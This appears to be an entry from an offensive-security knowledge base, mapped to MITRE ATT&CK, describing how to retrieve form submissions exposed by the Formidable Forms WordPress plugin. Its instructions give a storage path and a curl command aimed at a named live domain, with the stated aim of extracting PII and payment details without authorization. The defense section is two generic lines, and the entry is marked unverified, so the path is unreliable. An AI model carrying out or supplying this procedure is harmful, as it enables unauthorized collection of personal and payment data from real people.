---
tags:
  - data-exposure
  - pii-leak
type: procedure
tools: []
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/curl-form-data-access]]'
platforms:
  - Web
  - WordPress
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: 60c656fb-6864-4fc0-b416-5cce9b3fa4a4
created_at: '2025-12-14T00:11:25.147Z'
updated_at: '2025-12-14T00:11:25.147Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Access Exposed Form Data

## Summary

This procedure accesses sensitive form submissions exposed by the vulnerable Formidable Forms plugin, retrieving PII, payment details, and other user data without authorization.

## Description

Due to improper protection in the plugin, submitted form data is exposed in cleartext. This affects sites collecting user data, like Uber Singapore's microsite, leading to massive data leaks.

## Requirements

1. Knowledge of form data storage paths in WordPress
2. Network access to the site
3. Tools for HTTP requests

## Defense

Defensive measures and detection strategies:

- Encrypt sensitive data at rest and in transit
- Restrict access to form submission directories

## Objectives

1. Locate exposed data endpoints
2. Retrieve and extract sensitive information
3. Assess scope of data exposure

## Instructions

### Step 1: Identify Data Storage Path

**Context**: Determine the plugin's data upload directory.

> Common path: /wp-content/uploads/formidable/forms/data

### Step 2: Fetch Exposed Data

**Context**: Request the data directly.

**Command** ([[commands/curl-form-data-access]]):
```bash
curl "http://lioncityrentals.com.sg/wp-content/uploads/formidable/forms/data"
```

> Parse the response for user submissions including PII and payments.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques



## Commands Used

- [[commands/curl-form-data-access]]

## Tools Used



## Tags

- data-exposure
- leak
